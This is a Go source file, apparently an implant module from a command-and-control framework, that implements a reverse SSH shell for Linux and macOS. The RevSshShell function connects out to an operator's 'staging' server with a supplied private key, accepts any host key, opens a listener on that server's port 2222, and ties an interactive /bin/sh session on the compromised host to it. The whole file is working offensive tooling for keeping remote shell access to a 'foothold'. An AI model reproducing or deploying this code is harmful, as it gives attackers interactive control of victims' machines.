// +build linux darwin


package biterpreter

import (
	
	"io"
	//"log"
	"net"
	"os/exec"
	"syscall"

	"github.com/kr/pty"
	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"

	//Fixes
	"time"
	"encoding/json"
	"fmt"
)

/*
This JSON Object definition is needed in some Implants Modules to decode parameters
Hive will have the same definitions in: ./src/hive/hiveJobs.go
*/
type InjectRevSshShellBichito struct {
    Domain string   `json:"domain"`
    Sshkey string   `json:"sshkey"`
    Port string   `json:"port"`
    User string   `json:"user"`
}

/*
Description: Inject Reverse Shell --> Linux,Darwin
Flow:
A.Use golang ssh native library to spawn a ssh client that connects to a target staging
	A1.Use provided credentials (username and pem key), for the ssh connection
B.This connection will create a listener in 2222 localport of target staging
C.Spawn a sh process within the foothold, and pipe stdout/stdin(tty) through this last opened socket
*/
func RevSshShell(jsonparams string) (bool,string){

	//Debug
	fmt.Println(jsonparams)

	var revsshshellparams *InjectRevSshShellBichito
	errDaws := json.Unmarshal([]byte(jsonparams),&revsshshellparams)
	if errDaws != nil {
		return true,"Parameters JSON Decoding error:"+errDaws.Error()
	}

	auth, err := loadPrivateKey(revsshshellparams.Sshkey)
	if err != nil {
		return true,"Load Key String error"
	}

	config := &ssh.ClientConfig{
		User: revsshshellparams.User,
		Auth: nil,
	    HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
            return nil
        },
        Timeout:time.Second * 1,
	}

	config.Auth = append(config.Auth, auth)

	// Dial the SSH connection
	sshConn, err := ssh.Dial("tcp", revsshshellparams.Domain+":"+revsshshellparams.Port, config)
	if err != nil {
		return true,"Error: error dialing remote host:"+err.Error()
	}


	// Listen on remote
	l, err := sshConn.Listen("tcp", "127.0.0.1:2222")
	if err != nil {
		return true,"Error: error listening on remote host:"+err.Error()
	}

	go listenSSH(sshConn,l)

	return false,"Success: Rev SSH Shell Connected to Staging"
}


func listenSSH(sshconn *ssh.Client,l net.Listener){

	defer sshconn.Close()

	// Start accepting shell connections
	for {
		conn, err := l.Accept()
		if err != nil {
			continue
		}

		handleConnection(conn)

		return
	}
}

func handleConnection(c net.Conn) {
	defer c.Close()

	// Start the command
	cmd := exec.Command("/bin/sh")

	// Create PTY
	pty, tty, err := pty.Open()
	if err != nil {
		return
	}
	defer tty.Close()
	defer pty.Close()

	// Put the TTY into raw mode
	_, err = terminal.MakeRaw(int(tty.Fd()))
	if err != nil {
	}

	// Hook everything up
	cmd.Stdout = tty
	cmd.Stdin = tty
	cmd.Stderr = tty
	if cmd.SysProcAttr == nil {
		cmd.SysProcAttr = &syscall.SysProcAttr{}
	}

	cmd.SysProcAttr.Setctty = true
	cmd.SysProcAttr.Setsid = true

	// Start command
	err = cmd.Start()
	if err != nil {
		return
	}

	errs := make(chan error, 3)

	go func() {
		_, err := io.Copy(c, pty)
		errs <- err
	}()
	go func() {
		_, err := io.Copy(pty, c)
		errs <- err
	}()
	go func() {
		errs <- cmd.Wait()
	}()

	// Wait for a single error, then shut everything down. Since returning from
	// this function closes the connection, we just read a single error and
	// then continue.
	<-errs
}

func loadPrivateKey(keyString string) (ssh.AuthMethod, error) {


	signer, signerErr := ssh.ParsePrivateKey([]byte(keyString))
	if signerErr != nil {
		return nil, signerErr
	}
	return ssh.PublicKeys(signer), nil
}